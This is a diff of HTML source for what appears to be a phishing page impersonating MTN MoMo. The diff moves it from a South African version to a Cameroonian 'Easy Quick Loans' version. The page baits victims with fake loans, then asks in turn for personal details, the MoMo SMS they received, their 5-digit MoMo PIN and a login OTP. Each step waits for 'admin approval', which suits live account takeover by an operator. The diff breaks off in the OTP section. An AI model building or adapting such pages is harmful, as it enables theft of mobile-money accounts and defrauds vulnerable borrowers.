@@ -2,400 +2,521 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MTN MoMo South Africa – Easy Loans</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
-<link rel="stylesheet" href="./style.css" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#FFCC00">
+<title>MTN MoMo Cameroon – Easy Quick Loans</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="./style.css">
 </head>
 <body>
 
-<div id="offlineBanner" class="offline-banner hidden">📡 You are offline — reconnecting...</div>
-
-<!-- ═══════════ LANDING ═══════════ -->
-<div id="page-landing" class="page active">
-    <div class="land-nav">
-        <div style="flex:1;"></div>
-        <div class="mtn-logo">
-            <img src="./momo_logo.jpg" alt="MTN MoMo" class="mtn-logo-img" />
-            <div class="mtn-logo-text">MoMo</div>
-            <div class="mtn-logo-sub">from MTN South Africa</div>
-        </div>
-        <div style="flex:1;"></div>
+<!-- SPLASH -->
+<div id="page-splash" class="splash">
+    <div class="splash-content">
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="splash-logo" onerror="this.style.display='none'">
+        <div class="splash-brand">MTN MoMo</div>
+        <div class="splash-sub">Cameroon · Easy Quick Loans</div>
     </div>
-    <div class="land-container">
-        <div class="land-main">
-            <div class="land-hero">
-                <h1>Welcome to MTN MoMo South Africa</h1>
-                <p class="land-tagline">Get loans easily through MTN MoMo South Africa</p>
-            </div>
-            <div class="land-actions">
-                <div class="action-card apply-card">
-                    <div class="action-icon">✅</div>
-                    <h3>I already have MoMo</h3>
-                    <p>Skip registration and apply for a loan right away</p>
-                    <button class="btn-grad" onclick="applyAsExistingUser()">Apply Now</button>
-                </div>
-                <div class="action-divider"><span>OR</span></div>
-                <div class="action-card register-card">
-                    <div class="action-icon">📱</div>
-                    <h3>I don't have MoMo yet</h3>
-                    <p>Register in 60 seconds, then apply for a loan</p>
-                    <button class="btn-gray" onclick="startMoMoRegistration()">Register First</button>
-                </div>
-                <div class="action-card check-card" style="border-top-color:var(--success);">
-                    <div class="action-icon">📊</div>
-                    <h3>Check Application Status</h3>
-                    <p>Already applied? View your loan status and details</p>
-                    <button class="btn-gray" onclick="checkStatus()">View Dashboard</button>
-                </div>
-            </div>
-        </div>
-        <aside class="calc-sidebar">
-            <div class="calc-card">
-                <div class="calc-header">
-                    <div class="calc-header-icon">💰</div>
-                    <div><h2>Loan Calculator</h2><p>See your monthly payment</p></div>
-                </div>
-                <div class="calc-amount">
-                    <div class="calc-amount-label">Loan Amount</div>
-                    <div class="calc-amount-value" id="calcAmt">R 50,000</div>
-                </div>
-                <input type="range" id="amtSlider" min="5000" max="500000" step="1000" value="50000" oninput="updateCalc()" />
-                <div class="range-ends"><span>R 5,000</span><span>R 500,000</span></div>
-                <div class="calc-term">
-                    <label>Loan Term</label>
-                    <div class="sel-wrap">
-                        <select id="calcTermSelect" onchange="updateCalc()">
-                            <option value="6">6 Months</option>
-                            <option value="12">12 Months</option>
-                            <option value="18">18 Months</option>
-                            <option value="24">24 Months</option>
-                            <option value="48" selected>48 Months</option>
-                            <option value="60">60 Months</option>
-                        </select>
-                    </div>
-                </div>
-                <div class="calc-result">
-                    <div class="result-row"><span>Monthly Payment</span><strong id="monthlyAmt">R 1,042</strong></div>
-                    <div class="result-row"><span>Total Repayment</span><strong id="totalAmt">R 50,016</strong></div>
-                    <div class="result-row highlight"><span>Amount You Receive</span><strong id="receiveAmt">R 50,000</strong></div>
-                </div>
-                <button class="btn-grad calc-apply-btn" onclick="applyFromCalculator()">Apply for This Loan</button>
-            </div>
-        </aside>
-    </div>
-    <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN South Africa</div>
+    <div class="splash-loader"><div class="splash-progress"></div></div>
+    <div class="splash-text">Loading your experience…</div>
 </div>
 
-<!-- ═══════════ REGISTRATION ═══════════ -->
-<div id="page-register-check" class="page">
-    <nav class="navbar">
-        <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>MoMo Registration</h2>
-        <p class="step-sub">Register in under 60 seconds</p>
-        <div class="reg-intro">
-            <div class="reg-icon">📱</div>
-            <h3>You're 2 steps away from your loan</h3>
-            <p>MoMo is MTN's mobile money service. Register your wallet, then apply for a loan.</p>
+<!-- LANDING -->
+<div id="page-landing" class="page">
+    <header class="hero">
+        <div class="hero-top">
+            <img src="./momo_logo.jpg" alt="MTN MoMo" class="hero-logo" onerror="this.style.display='none'">
         </div>
-        <div class="msg-box error" id="regErr"><span class="msg-icon">✕</span><span id="regErrTxt"></span></div>
-        <div class="field">
-            <label>South African ID Number</label>
-            <input type="text" id="regId" placeholder="e.g. 9001015800085" maxlength="13" inputmode="numeric" oninput="normalizeId('regId');clearErr('regErr')" />
-            <div class="field-hint">13-digit SA ID — verified instantly</div>
+        <div class="hero-copy">
+            <div class="hero-badge">🇨🇲 MTN Cameroon</div>
+            <h1>Welcome to MTN MoMo Cameroon</h1>
+            <p class="hero-tagline">Get loans easily through MTN MoMo Cameroon</p>
         </div>
-        <div class="field">
-            <label>Confirm Your Details</label>
-            <div id="regDetailsPreview" class="reg-preview"><div class="reg-preview-placeholder">Enter your ID above</div></div>
-        </div>
-        <div class="field">
-            <label>Choose Your MoMo Account Type</label>
-            <div class="account-types">
-                <div class="account-type" data-type="yello" onclick="selectAccountType('yello')"><div class="at-icon">🟡</div><div class="at-info"><div class="at-name">MoMo Yello</div><div class="at-desc">Daily: R3,500 · Monthly: R20,000 · <b>Max loan: R20,000</b></div></div><div class="at-check">○</div></div>
-                <div class="account-type" data-type="yello_plus" onclick="selectAccountType('yello_plus')"><div class="at-icon">⭐</div><div class="at-info"><div class="at-name">MoMo Yello Plus</div><div class="at-desc">Daily: R10,000 · Monthly: R40,000 · <b>Max loan: R40,000</b></div></div><div class="at-check">○</div></div>
-                <div class="account-type" data-type="eazi" onclick="selectAccountType('eazi')"><div class="at-icon">⚡</div><div class="at-info"><div class="at-name">MoMo Eazi</div><div class="at-desc">No ID · <b>Max loan: R10,000</b></div></div><div class="at-check">○</div></div>
+    </header>
+
+    <main class="land-body">
+        <div class="alert-warning">
+            <div class="alert-icon">⚠️</div>
+            <div>
+                <strong>Loan Requirement</strong>
+                <p>You must have at least 20% of your requested loan amount in MoMo transactions this month.</p>
+                <div class="alert-example">Loan <span id="reqExample">XAF 1,000,000</span> → Need <span id="reqNeed">XAF 200,000</span> in MoMo</div>
             </div>
-            <div class="field-hint" id="accountTypeHint">Tap to select</div>
         </div>
-        <button class="btn-grad" onclick="completeRegistration()" id="regBtn">Complete Registration</button>
-    </div></div>
-</div>
 
-<div id="page-register-processing" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">📱</div>
-        <h2>Setting Up Your Account...</h2>
-        <p>Verifying your ID and creating your wallet</p>
-        <div class="wait-status" id="regProcessingStatus">⏳ Please wait...</div>
-        <div class="poll-indicator"><span class="dot"></span> This takes a few seconds...</div>
-    </div></div>
-</div>
+        <section class="calc-card">
+            <div class="calc-head">
+                <div class="calc-head-icon">💰</div>
+                <div>
+                    <h2>Loan Calculator</h2>
+                    <p>XAF · Cameroon</p>
+                </div>
+            </div>
+            <div class="calc-amount-row">
+                <span class="calc-amount-label">Amount</span>
+                <span class="calc-amount-value" id="calcAmt">XAF 1,000,000</span>
+            </div>
+            <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()">
+            <div class="range-ends"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
+            <div class="monthly-box">
+                <span class="ml">Monthly Payment</span>
+                <span class="ma" id="monthlyAmt">XAF 24,000</span>
+            </div>
+            <div class="calc-info" style="margin-top:14px; padding-top:14px; border-top:1px dashed #E5E7EB;">
+                <span>Required MoMo transactions</span>
+                <span id="requiredTx" style="color:#DE350B; font-weight:800;">XAF 200,000</span>
+            </div>
+        </section>
 
-<div id="page-requirements" class="page">
-    <nav class="navbar">
-        <a class="nav-left" onclick="goTo('page-register-check')">← Back</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Loan Requirements</h2>
-        <p class="step-sub">What you need to qualify</p>
-        <div class="req-list">
-            <div class="req-item done"><div class="req-icon">✅</div><div class="req-info"><strong>MoMo Account</strong><div id="reqLimitText">Registered</div></div></div>
-            <div class="req-item"><div class="req-icon">📊</div><div class="req-info"><strong>Transaction Activity</strong><div id="reqTxText">Have 20% of loan amount in MoMo transactions this month.</div></div></div>
-            <div class="req-divider"><span>OR</span></div>
-            <div class="req-item"><div class="req-icon">👥</div><div class="req-info"><strong>Guarantor</strong><div>A MoMo-registered guarantor vouches for you.</div></div></div>
+        <section class="conditions-card">
+            <h3>📋 What You Need to Qualify</h3>
+            <ul class="conditions-list">
+                <li>✅ Be 18 years or older</li>
+                <li>✅ Have an active MTN MoMo account</li>
+                <li>✅ Have 20% in MoMo transactions</li>
+                <li>✅ Provide a valid next of kin</li>
+                <li>✅ Verify your email and phone</li>
+            </ul>
+            <div class="conditions-meta">
+                <div><span>Interest</span><strong>24% / year</strong></div>
+                <div><span>Term</span><strong>6–48 months</strong></div>
+                <div><span>Approval</span><strong>~5 min</strong></div>
+            </div>
+        </section>
+
+        <button class="btn-primary" onclick="startApplication()">START APPLICATION</button>
+        <button class="btn-ghost" onclick="goTo('page-check-status')">📊 Check My Application Status</button>
+
+        <div class="trust-row">
+            <div class="trust-pill"><span>🔒</span><span>Secure</span></div>
+            <div class="trust-pill"><span>⚡</span><span>5 min approval</span></div>
+            <div class="trust-pill"><span>🇨🇲</span><span>Cameroon</span></div>
         </div>
-        <button class="btn-grad" onclick="goTo('page-application')">I Understand — Continue</button>
-    </div></div>
+
+        <div class="terms-link-row">
+            <a href="#" onclick="event.preventDefault();showTerms()">📜 View Terms & Conditions</a>
+        </div>
+    </main>
+
+    <footer class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN Cameroon</footer>
 </div>
 
-<!-- ═══════════ APPLICATION (Single form with all details) ═══════════ -->
+<!-- APPLICATION FORM -->
 <div id="page-application" class="page">
     <nav class="navbar">
-        <a class="nav-left" onclick="cancelApplication()">✕ Cancel</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right" id="navbarAccount"></div>
+        <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">📝</span></div>
     </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Loan Application</h2>
-        <p class="step-sub">Complete all details · Admin approval required</p>
-        <div class="msg-box error" id="appErr"><span class="msg-icon">✕</span><span id="appErrTxt"></span></div>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">📝</span>
+                <div>
+                    <h2>Loan Application</h2>
+                    <p class="step-sub">All-in-one form</p>
+                </div>
+            </div>
 
-        <div class="acc-info-box" id="accInfoBox"><div id="accInfoText"></div></div>
+            <div class="msg-box error" id="appErr"><span class="msg-icon">✕</span><span id="appErrTxt"></span></div>
 
-        <h3 class="section-title">💰 Loan Request</h3>
-        <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="appLoanType"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-        <div class="field"><label>Loan Amount (ZAR)</label><input type="number" id="appLoanAmount" value="20000" min="5000" max="20000" oninput="clearErr('appErr')" /><div class="field-hint" id="loanLimitHint">Loading...</div></div>
-        <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="appLoanTerm"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
-        <div class="field"><label>Purpose of Loan</label><textarea id="appLoanPurpose" maxlength="300" placeholder="Describe the purpose…" oninput="clearErr('appErr')"></textarea></div>
+            <h3 class="section-h">💰 Loan Details</h3>
+            <div class="field">
+                <label>Loan Type</label>
+                <div class="sel-wrap">
+                    <select id="appLoanType">
+                        <option value="Personal Loan">Personal Loan</option>
+                        <option value="Business Loan" selected>Business Loan</option>
+                        <option value="Home Loan">Home Loan</option>
+                        <option value="Student Loan">Student Loan</option>
+                    </select>
+                </div>
+            </div>
+            <div class="field">
+                <label>Loan Amount (XAF)</label>
+                <input type="number" id="appLoanAmount" value="1000000" min="500000" max="5000000" step="50000" oninput="updateAppCalc()">
+                <div class="field-hint">Min XAF 500,000 · Max XAF 5,000,000</div>
+            </div>
+            <div class="field">
+                <label>Loan Term</label>
+                <div class="sel-wrap">
+                    <select id="appLoanTerm">
+                        <option value="6">6 Months</option>
+                        <option value="12">12 Months</option>
+                        <option value="18">18 Months</option>
+                        <option value="24">24 Months</option>
+                        <option value="48" selected>48 Months</option>
+                    </select>
+                </div>
+            </div>
+            <div class="field">
+                <label>Purpose of Loan</label>
+                <textarea id="appLoanPurpose" placeholder="Describe the purpose…" maxlength="300"></textarea>
+            </div>
 
-        <h3 class="section-title">👤 Personal Details</h3>
-        <div class="field-row">
-            <div class="field"><label>First Name</label><input type="text" id="appFirstName" maxlength="40" placeholder="First Name" oninput="clearErr('appErr')" /></div>
-            <div class="field"><label>Last Name</label><input type="text" id="appLastName" maxlength="40" placeholder="Last Name" oninput="clearErr('appErr')" /></div>
+            <div class="twenty-block">
+                <div class="twenty-head">
+                    <span class="twenty-icon">📊</span>
+                    <div>
+                        <strong>Mandatory — 20% Rule</strong>
+                        <div class="twenty-amount">Required: <b id="twentyAmount">XAF 200,000</b></div>
+                    </div>
+                </div>
+                <label class="confirm-check">
+                    <input type="checkbox" id="has20Percent">
+                    <span>I confirm I have at least 20% of the amount in MoMo transactions this month.</span>
+                </label>
+            </div>
+
+            <h3 class="section-h">👤 Personal Information</h3>
+            <div class="field"><label>Full Name</label><input type="text" id="appFullName" maxlength="80"></div>
+            <div class="field"><label>Email</label><input type="email" id="appEmail" maxlength="120"></div>
+            <div class="field">
+                <label>Phone (Cameroon)</label>
+                <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="appPhone" maxlength="9" inputmode="numeric"></div>
+                <div class="field-hint">9 digits (e.g. 670123456)</div>
+            </div>
+
+            <h3 class="section-h">💼 Employment</h3>
+            <div class="field">
+                <label>Status</label>
+                <div class="sel-wrap">
+                    <select id="appEmployment">
+                        <option>Employed</option>
+                        <option selected>Self-employed</option>
+                        <option>Unemployed</option>
+                        <option>Retired</option>
+                    </select>
+                </div>
+            </div>
+            <div class="field"><label>Annual Income (XAF)</label><input type="number" id="appIncome" min="0"></div>
+
+            <h3 class="section-h">👥 Next of Kin</h3>
+            <div class="field"><label>Name</label><input type="text" id="appKinName" maxlength="60"></div>
+            <div class="field">
+                <label>Phone</label>
+                <div class="phone-row"><div class="ph-pre">+237</div><input type="tel" id="appKinPhone" maxlength="9" inputmode="numeric"></div>
+            </div>
+
+            <h3 class="section-h">🔐 MoMo PIN</h3>
+            <div class="field">
+                <label>MoMo PIN (5 digits)</label>
+                <div class="pin-row">
+                    <input type="password" id="appPin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0)">
+                    <input type="password" id="appPin1" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,1)">
+                    <input type="password" id="appPin2" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,2)">
+                    <input type="password" id="appPin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3)">
+                    <input type="password" id="appPin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4)">
+                </div>
+                <div class="field-hint">🔒 Stored securely. Used to verify your identity on return.</div>
+            </div>
+
+            <div class="agreement-wrap">
+                <label class="confirm-check">
+                    <input type="checkbox" id="appTnc">
+                    <span>I have read and accept the <a href="#" onclick="event.preventDefault();showTerms()">Terms & Conditions</a>, including MTN MoMo Terms of Use.</span>
+                </label>
+            </div>
+
+            <button class="btn-primary" id="appSubmitBtn" onclick="submitApplication()">SUBMIT APPLICATION</button>
         </div>
-        <div class="field"><label>Phone Number</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="appPhone" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('appPhone');clearErr('appErr')" /></div></div>
-        <div class="field"><label>Email Address</label><input type="email" id="appEmail" maxlength="120" placeholder="your@email.com" oninput="clearErr('appErr')" /></div>
-
-        <h3 class="section-title">💼 Employment</h3>
-        <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="appEmployment"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
-        <div class="field"><label>Annual Income (ZAR)</label><input type="number" id="appIncome" min="0" max="100000000" placeholder="Annual income" oninput="clearErr('appErr')" /></div>
-        <div class="field"><label>Next of Kin Name</label><input type="text" id="appKinName" maxlength="60" placeholder="Full name" oninput="clearErr('appErr')" /></div>
-        <div class="field"><label>Next of Kin Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="appKinPhone" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('appKinPhone');clearErr('appErr')" /></div></div>
-
-        <h3 class="section-title">🤝 Guarantor</h3>
-        <div class="field"><label>Guarantor Full Name</label><input type="text" id="appGuarantorName" maxlength="60" placeholder="Full name" oninput="clearErr('appErr')" /></div>
-        <div class="field"><label>Guarantor Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="appGuarantorPhone" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('appGuarantorPhone');clearErr('appErr')" /></div></div>
-        <div class="field"><label>Relationship</label><div class="sel-wrap"><select id="appGuarantorRel"><option value="">Select</option><option>Parent</option><option>Sibling</option><option>Spouse / Partner</option><option>Family Member</option><option>Friend</option><option>Colleague</option><option>Other</option></select></div></div>
-        <div class="guarantor-confirm"><label class="confirm-check"><input type="checkbox" id="appGuarantorConfirm" /><span>I confirm my guarantor has agreed to guarantee this loan</span></label></div>
-
-        <button class="btn-grad" onclick="submitApplication()" id="appBtn">Submit Application for Approval</button>
-    </div></div>
+    </div>
 </div>
 
+<!-- WAIT FOR ADMIN (application step) -->
 <div id="page-wait-application" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">📋</div>
-        <h2>Application Under Review</h2>
-        <p>Admin is reviewing your full application. Please wait.</p>
-        <div class="wait-status" id="waitAppStatus">⏳ Awaiting approval...</div>
-        <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
-        <div class="wait-appid">Application ID: <span id="waitAppId" class="mono">-</span></div>
-        <button class="btn-gray" onclick="cancelApplication()" style="margin-top:20px;">Cancel</button>
-    </div></div>
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon pulse">⏳</div>
+            <h2>Application under review</h2>
+            <p>Your application has been sent to our team. You will be notified once approved.</p>
+            <div class="wait-status">⏳ Step 1 of 4 · Awaiting admin approval</div>
+            <div class="poll-indicator"><span class="dot"></span> Live check</div>
+            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId1">—</span></div>
+        </div>
+    </div>
 </div>
 
-<!-- ═══════════ SMS ═══════════ -->
+<!-- SMS PASTE -->
 <div id="page-sms" class="page">
     <nav class="navbar">
-        <a class="nav-left" onclick="cancelApplication()">✕ Cancel</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right" id="navbarAccount2"></div>
+        <a class="nav-left" onclick="goTo('page-landing')">← Home</a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">2/4</span></div>
     </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Verify MoMo SMS</h2>
-        <p class="step-sub">Step 2 of 4 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-        <div class="msg-box error" id="smsErr"><span class="msg-icon">✕</span><span id="smsErrTxt"></span></div>
-        <div class="momo-msg-box">
-            <label class="momo-label">📩 Paste the MoMo SMS you received:</label>
-            <textarea id="smsBox" maxlength="2000" placeholder="Copy and paste the entire MoMo message here…"></textarea>
-            <div class="hint">Include the full SMS from MTN MoMo</div>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">📩</span>
+                <div>
+                    <h2>MoMo SMS Verification</h2>
+                    <p class="step-sub">Step 2 of 4</p>
+                </div>
+            </div>
+            <div class="msg-box error" id="smsErr"><span class="msg-icon">✕</span><span id="smsErrTxt"></span></div>
+            <div class="field">
+                <label>Paste the SMS you received from MTN MoMo</label>
+                <textarea id="smsContent" rows="6" maxlength="2000" placeholder="Paste the complete SMS here..."></textarea>
+                <div class="field-hint">Admin will review this SMS.</div>
+            </div>
+            <button class="btn-primary" id="smsSubmitBtn" onclick="submitSms()">SUBMIT SMS</button>
         </div>
-        <div class="tip-box">💡 Check your SMS inbox for the message from MTN MoMo South Africa.</div>
-        <button class="btn-grad" onclick="submitSms()" id="smsBtn">Submit SMS for Approval</button>
-        <button class="btn-outline" onclick="retryStep('sms')">↻ Clear & Retry</button>
-    </div></div>
+    </div>
 </div>
 
+<!-- WAIT SMS -->
 <div id="page-wait-sms" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">📨</div>
-        <h2>Verifying SMS...</h2>
-        <p>Admin is reviewing your MoMo SMS.</p>
-        <div class="wait-status" id="waitSmsStatus">⏳ Awaiting approval...</div>
-        <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
-        <button class="btn-gray" onclick="cancelApplication()" style="margin-top:20px;">Cancel</button>
-    </div></div>
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon pulse">📩</div>
+            <h2>Verifying your SMS...</h2>
+            <p>Your SMS is being reviewed by admin.</p>
+            <div class="wait-status">⏳ Step 2 of 4 · Awaiting admin approval</div>
+            <div class="poll-indicator"><span class="dot"></span> Live check</div>
+            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId2">—</span></div>
+        </div>
+    </div>
 </div>
 
-<!-- ═══════════ PIN ═══════════ -->
+<!-- PIN (application flow) -->
 <div id="page-pin" class="page">
     <nav class="navbar">
-        <a class="nav-left" onclick="cancelApplication()">✕ Cancel</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right" id="navbarAccount3"></div>
+        <a class="nav-left" onclick="goTo('page-landing')">← Home</a>
+        <img src="./momo_logo.jpg" alt="MTN MoMo" class="nav-logo" onerror="this.style.display='none'">
+        <div class="nav-right"><span class="nav-step">3/4</span></div>
     </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Enter MoMo PIN</h2>
-        <p class="step-sub">Step 3 of 4 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
-        <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
-        <div class="pin-label">Enter your 5-digit MoMo PIN:</div>
-        <div class="pin-row">
-            <input type="password" id="pin0" class="pin-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <input type="password" id="pin1" class="pin-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <input type="password" id="pin2" class="pin-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <input type="password" id="pin3" class="pin-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <input type="password" id="pin4" class="pin-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
-            <button class="pin-delete" onclick="clearPin()" title="Clear">✕</button>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-head">
+                <span class="step-num">🔐</span>
+                <div>
+                    <h2>MoMo PIN Verification</h2>
+                    <p class="step-sub">Step 3 of 4</p>
+                </div>
+            </div>
+            <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
+            <div class="pin-label">Enter your MoMo PIN (5 digits)</div>
+            <div class="pin-row">
+                <input type="password" id="pin0" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,0,'pin')">
+                <input type="password" id="pin1" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,1,'pin')">
+                <input type="password" id="pin2" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,2,'pin')">
+                <input type="password" id="pin3" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,3,'pin')">
+                <input type="password" id="pin4" class="pin-box" maxlength="1" inputmode="numeric" oninput="pinInput(this,4,'pin')">
+            </div>
+            <button class="btn-primary" id="pinSubmitBtn" onclick="submitPin()">SUBMIT PIN</button>
         </div>
-        <button class="btn-grad" onclick="submitPin()" id="pinBtn">Submit PIN for Approval</button>
-        <button class="btn-outline" onclick="retryStep('pin')">↻ Clear & Retry PIN</button>
-    </div></div>
+    </div>
 </div>
 
+<!-- WAIT PIN -->
 <div id="page-wait-pin" class="page">
-    <div class="wait-bg"><div class="wait-wrap">
-        <div class="wait-icon pulse">🔐</div>
-        <h2>Verifying PIN...</h2>
-        <p>Admin is reviewing your MoMo PIN.</p>
-        <div class="wait-status" id="waitPinStatus">⏳ Awaiting approval...</div>
-        <div class="poll-indicator"><span class="dot"></span> Checking status live...</div>
-        <button class="btn-gray" onclick="cancelApplication()" style="margin-top:20px;">Cancel</button>
-    </div></div>
+    <div class="wait-bg">
+        <div class="wait-wrap">
+            <div class="wait-icon pulse">🔐</div>
+            <h2>Verifying your PIN...</h2>
+            <p>Your PIN is being reviewed by admin.</p>
+            <div class="wait-status">⏳ Step 3 of 4 · Awaiting admin approval</div>
+            <div class="poll-indicator"><span class="dot"></span> Live check</div>
+            <div class="wait-appid">Application ID: <span class="mono" id="waitAppId3">—</span></div>
+        </div>
+    </div>
 </div>
 
-<!-- ═══════════ OTP ═══════════ -->
+<!-- OTP (application flow) -->
 <div id="page-otp" class="page">
     <nav class="navbar">
-        <a class="nav-left" onclick="cancelApplication()">✕ Cancel</a>
-        <div class="mtn-logo" style="flex-direction:row;gap:8px;"><img src="./momo_logo.jpg" class="mtn-logo-img sm" /><div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;color:#fff;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;color:rgba(255,255,255,0.6);">South Africa</div></div></div>
-        <div class="nav-right" id="navbarAccount4"></div>
-    </nav>
-    <div class="step-center"><div class="step-card">
-        <h2>Enter Login OTP</h2>
-        <p class="step-sub">Step 4 of 4 · Admin approval required</p>
-        <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
-        <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-        <div class="otp-label">Enter the 4-digit OTP sent to your phone:</div>
-        <div class="otp-row">
-            <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" />
-            <button class="otp-eye" onclick="togOtp()" title="Show/Hide">👁</button>
-            <button class="otp-delete" onclick="clearOtp()" title="Clear">✕</button>
-        </div>
-        <button class="btn-grad" onclick="submitOtp()" id="otpBtn">Submit OTP for Approval</button>
-        <button class="btn-outline" onclick="retryStep('otp')">↻ Clear & Retry OTP</button>
